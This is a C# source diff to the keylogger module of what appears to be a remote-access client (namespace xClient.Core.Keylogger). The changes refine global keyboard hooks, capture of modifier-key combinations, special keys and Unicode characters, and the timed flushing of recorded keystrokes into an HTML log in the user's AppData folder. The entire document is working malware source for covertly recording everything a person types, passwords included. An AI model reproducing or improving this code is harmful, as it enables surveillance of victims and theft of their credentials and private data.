@@ -18,7 +18,6 @@ namespace xClient.Core.Keylogger
         private bool disposed = false;
 
         private StringBuilder _logFileBuffer;
-        private string _hWndTitle;
         private string _hWndLastTitle;
 
         private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
@@ -50,6 +49,11 @@ namespace xClient.Core.Keylogger
 
             _timerFlush.Enabled = true;
             _timerFlush.Start();
+
+            // Initialize the application message pipeline.
+            // Necessary for setting global hooks because setting a global
+            // hook requires an established message pipeline for the thread.
+            Application.Run();
         }
 
         ~Logger()
@@ -59,7 +63,7 @@ namespace xClient.Core.Keylogger
             // It is a safe-guard because we want to make sure we unsubscribe from these
             // things or the client may not be able to get keystrokes/mouse clicks to any
             // other application (including Windows).
-            Dispose(true);
+            Dispose(false);
         }
 
         public void Dispose()
@@ -80,10 +84,10 @@ namespace xClient.Core.Keylogger
                         _timerFlush.Dispose();
                     }
 
-                    Unsubscribe();
-
                     disposed = true;
                 }
+
+                Unsubscribe();
             }
         }
 
@@ -127,63 +131,141 @@ namespace xClient.Core.Keylogger
             m_Events.Dispose();
         }
 
-        private void OnKeyDown(object sender, KeyEventArgs e)
+        private void OnKeyDown(object sender, KeyEventArgs e) //Called first
         {
-            PressedKeys.Add(e.KeyCode);
+            // If modifier keys are still down, the key code provided will
+            // be recorded for flushing to the 
+            if (PressedKeys.Contains(Keys.LControlKey)
+                || PressedKeys.Contains(Keys.RControlKey)
+                || PressedKeys.Contains(Keys.LMenu)
+                || PressedKeys.Contains(Keys.RMenu)
+                || PressedKeys.Contains(Keys.LWin)
+                || PressedKeys.Contains(Keys.RWin))
+            {
+                if (!PressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
+                {
+                    PressedKeys.Add(e.KeyCode);
+                }
+            }
+            else if (e.KeyCode >= Keys.Left && e.KeyCode <= Keys.Down)
+            {
+                _logFileBuffer.Append(@"<p class=""h"">(" + e.KeyCode.ToString() + ")</p>");
+            }
+            else
+            {
+                switch (e.KeyCode)
+                {
+                    case Keys.Enter:
+                        _logFileBuffer.Append(@"<p class=""h"">(ENTER)</p><br>"); //this could be where the KeyloggerKeys enum would be handy
+                        break;
+                    case Keys.Space:
+                        _logFileBuffer.Append(" ");
+                        break;
+                    case Keys.Back:
+                        _logFileBuffer.Append(@"<p class=""h"">(BACK)</p>");
+                        break;
+                    case Keys.Delete:
+                        _logFileBuffer.Append(@"<p class=""h"">(DEL)</p>");
+                        break;
+                    default:
+                        {
+                            // The keys below are excluded. If it is one of the keys below,
+                            // the KeyPress event will handle these characters. If the keys
+                            // are not any of those specified below, we can continue.
+                            if (!((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z)
+                            || (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide)
+                            || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
+                            || (e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
+                            || (e.KeyCode >= Keys.LShiftKey && e.KeyCode <= Keys.RShiftKey)
+                            || (e.KeyCode == Keys.CapsLock))))
+                            {
+                                // The key was not part of the keys that we wish to filter, so
+                                // be sure to prevent a situation where multiple keys are pressed.
+                                if (!PressedKeys.Contains(e.KeyCode))
+                                {
+                                    PressedKeys.Add(e.KeyCode);
+                                }
+                            }
+
+                            break;
+                        }
+                }
+            }
         }
 
-        private void OnKeyUp(object sender, KeyEventArgs e)
+        private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
+        {
+            //This method should be used to process all of our unicode characters
+            _logFileBuffer.Append(e.KeyChar);
+        }
+
+        private void OnKeyUp(object sender, KeyEventArgs e) //Called third
         {
             _logFileBuffer.Append(HighlightSpecialKeys(PressedKeys.ToArray()));
-
-            PressedKeys.Remove(e.KeyCode);
-        }
-
-        private void Logger_KeyPress(object sender, KeyPressEventArgs e)
-        {
-            _logFileBuffer.Append(e.KeyChar + " ");
         }
 
         private string HighlightSpecialKeys(Keys[] _names)
         {
+            if (_names.Length < 1) return string.Empty;
+
             string[] names = new string[_names.Length];
-            Array.Copy(_names, names, _names.Length);
-
-            return HighlightSpecialKeys(names);
-        }
-
-        private string HighlightSpecialKeys(string[] names)
-        {
-            if (names.Length < 1) return string.Empty;
-
-            StringBuilder specialKeys = new StringBuilder();
-
-            int ValidSpecialKeys = 0;
-            for (int i = 0; i < names.Length; i++)
+            for (int i = 0; i < _names.Length; i++)
             {
-                if (!string.IsNullOrEmpty(names[i]))
+                names[i] = _names[i].ToString();
+            }
+
+            if (PressedKeys.Contains(Keys.LControlKey)
+                || PressedKeys.Contains(Keys.RControlKey)
+                || PressedKeys.Contains(Keys.LMenu)
+                || PressedKeys.Contains(Keys.RMenu)
+                || PressedKeys.Contains(Keys.LWin)
+                || PressedKeys.Contains(Keys.RWin))
+            {
+                StringBuilder specialKeys = new StringBuilder();
+
+                int ValidSpecialKeys = 0;
+                for (int i = 0; i < names.Length; i++)
                 {
-                    if (ValidSpecialKeys == 0)
+                    PressedKeys.Remove(_names[i]);
+                    if (!string.IsNullOrEmpty(names[i]))
                     {
-                        specialKeys.AppendFormat("<font color=\"0000FF\">([{0}] ", names[i]);
-                    }
-                    else
-                    {
-                        specialKeys.AppendFormat("+ [{0}]", names[i]);
-                    }
+                        if (ValidSpecialKeys == 0)
+                        {
+                            specialKeys.AppendFormat(@"<p class=""h"">([{0}] ", names[i]);
+                        }
+                        else
+                        {
+                            specialKeys.AppendFormat("+ [{0}]", names[i]);
+                        }
 
-                    ValidSpecialKeys++;
+                        ValidSpecialKeys++;
+                    }
                 }
-            }
 
-            // If there are items in the special keys string builder, give it an ending
-            // font tag and some trailing white-space.
-            if (ValidSpecialKeys > 0)
+                // If there are items in the special keys string builder, give it an ending
+                // font tag and some trailing white-space.
+                if (ValidSpecialKeys > 0)
+                {
+                    specialKeys.Append(")</p> ");
+                }
+
+                return specialKeys.ToString();
+            }
+            else
             {
-                specialKeys.Append(")</font> ");
-            }
+                StringBuilder normalKeys = new StringBuilder();
 
-            return specialKeys.ToString();
+                for (int i = 0; i < names.Length; i++)
+                {
+                    PressedKeys.Remove(_names[i]);
+                    if (!string.IsNullOrEmpty(names[i]))
+                    {
+                        normalKeys.Append(names[i]);
+                    }
+                }
+
+                return normalKeys.ToString();
+            }
         }
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
@@ -214,8 +296,13 @@ namespace xClient.Core.Keylogger
                         {
                             if (writeHeader)
                             {
-                                sw.Write("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
+                                sw.WriteLine("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                          DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");
+
+                                // Write out our coloring scheme that will be used by the elements
+                                // generated by the logger.
+                                // h = Denotes highlighted text (blue color).
+                                sw.WriteLine("<style>.h { color: 0000ff; }</style>");
 
                                 if (_logFileBuffer.Length > 0)
                                     sw.Write(_logFileBuffer);
